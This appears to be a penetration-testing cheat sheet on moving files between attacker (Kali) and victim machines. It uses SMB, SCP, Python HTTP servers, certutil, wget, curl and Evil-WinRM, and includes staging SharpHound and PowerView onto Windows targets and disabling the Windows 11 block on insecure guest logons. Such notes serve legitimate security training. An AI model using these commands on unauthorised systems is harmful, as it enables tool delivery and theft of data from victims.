---
description: >-
  This took lots of time for me to compile and understand. However, through
  applying the "try harder" mentality, this concept has made me gain more
  confidence in my competence.
cover: https://media3.giphy.com/media/xTiTnjZAjQipGn9JFS/200.gif
coverY: 0
---

# 📤 File Transfer

{% hint style="danger" %}
WARNING

When using `python3 -m http.server`, be sure to close via `CTRL + C` to send a Signal Interrupt (SIGINT) to terminate the server after use.

This is because anyone on the network can arbitrarily obtain files from your system if they're listening!!
{% endhint %}

## Remote, from anywhere in the world file transfer (Internet Required)

[Magic-wormhole](https://github.com/magic-wormhole/magic-wormhole) is a fantastic Python utility that makes this possible.&#x20;

It is a "secure" way of sending small and large files over the Internet in a secure fashion.

{% hint style="info" %}
:sunglasses: This is really, really cool.
{% endhint %}

**Install via:**

<pre><code><strong># Linux
</strong><strong>sudo apt install magic-wormhole
</strong><strong>
</strong><strong># Windows
</strong><strong>pip install magic-wormhole
</strong></code></pre>

**From the computer you want to send a file from, tell your friend (or yourself) to run:**

```
wormhole send <file_name_here>

# On Windows, you may need to use wormhole.exe
wormhole.exe send <file_name_here>
```

:bulb:You will then receive a code to use on the receiving computer.

**Then on the computer you want to receive the file on:**

```
wormhole receive

#or 
wormhole.exe receive

# It will then prompt for the code

# File transfer will be initiated upon proper entry
```

_You'll then magically get your file!_

## Windows->Linux Methods

### SMB Server

**On Kali:**

```
impacket-smbserver smb . -smb2support
```

**On Windows:**

```
net use \\<kali-ip>\smb

copy \\<kali-ip>\smb\SharpHound.exe .

dir

SharpHound.exe
```

* Be sure to open up the file through the file manager on Linux (GUI)
* This makes things easier

### If on Windows 11 and Impacket's SMB Server Does not Work...

You will likely run into `System error 1272` occurring on the Windows machine. I could be wrong, but I believe that this is a new default security mechanism to thwart unauthenticated guest access to shared drives by default. In order to get around this, you can modify the group policy using the following instructions:

```
Open Local Group Policy Editor by typing gpedit.msc in the Run dialog (Win + R).

Navigate to Computer Configuration > Administrative Templates > Network > Lanman Workstation.

Find and double-click on Enable insecure guest logons.

Set it to Enabled, click OK, and close the editor.
```

### SCP

On the Windows side, use an SCP client like PowerShell with OpenSSH or a tool like [WinSCP](https://winscp.net/).

**For PowerShell, use the following command (replacing `<user>`, `<Kali_IP>`, and paths as necessary):**

```
scp <path_to_local_file> <user>@<Kali_IP>:/path/on/kali
```

### Python3 HTTP Server (`http.server`)

Very easy, however, it requires `python3` to be installed on the victim/host.

**On Windows:**

```
# Obtain IP address of Windows machine
ipconfig

# Navigate to directory of file(s) you want to serve
cd ...

# Start server
python3 -m http.server

# By default, an HTTP server will be hosted on 127.0.0.1:8000
```

**On Kali:**

```
wget http://windows-ip:8000/file-name-here
```

### Evil-WinRM

```
# Download to your Kali:
Evil-WinRM download /file/name/here

# Upload a file to the Windows victim from Kali
Evil-WinRM upload /file/name/here
```

## Linux->Windows

### Certutil

**On Kali:**

```
python3 -m http.server
```

**On Windows:**

```
certutil -urlcache -f http://<kali_ip_here:8000>/name_of_file name_of_file
```

### Linux -> Windows // Windows -> Linux // Windows -> Windows

{% hint style="info" %}
:bulb:UPDATE!! Newer versions of Windows now features wrappers to `wget`!&#x20;

This means that we can use `wget` the same way we do on Linux on Windows to grab our loot!
{% endhint %}

**On the system you're sending files from:**

```
# Obtain IP
ifconfig
ip a
ipconfig

# Setup Python HTTP Server
python3 -m http.server
```

**Receiving system:**

```
wget http://<obtained_IP_HERE>:8000/file_to_receive_here

# On Windows, you need to specify -o for output file
wget http://<obtained_IP_HERE>:8000/file_to_receive_here -o file_to_receive_here
```

### Evil-WinRM

```
Evil-WinRM: PS C:\programdata> upload /../../../PowerView.ps1
```

## Linux->Linux

### Wget

**On Kali:**

```
python3 -m http.server
```

**On Victim:**

```
wget http://<tun0_ip_here>:8000/<file_name_here> <file_name_here>
```

#### Or, to transfer an entire directory, use:

```
wget -r http://192.168.76.146:8000/stack
```

#### Even Better

**Download it all:**

```
wget -r -l inf -np -nH --cut-dirs=0 -R "index.html*" -P <Directory_to_save_to> http://webserver
```

### Curl

**On Kali:**

```
python3 -m http.server
```

**On Victim:**

```
curl http://<tun0_ip_here:8000/<file_name_here> <file_name_here>
```

## SCP

* Is SSH open?
* SSH Creds or Key
* Identify path of file you want with <mark style="color:red;">`pwd`</mark>

**Copying a file from a remote system to yours:**

```
scp user@10.10.10.1:C:/ftp/infrastructure .
password:

Infrastructure.pdf                                                     100%   45KB 240.7KB/s   00:00    
```

**Transfering a file from your system to a remote system:**

```
scp root@10.10.10.1 -i ~/.ssh/id_rsa wordlist.txt /root/wordlists
```

## References

{% embed url="https://0xdf.gitlab.io/2018/10/11/pwk-notes-post-exploitation-windows-file-transfers.html" %}
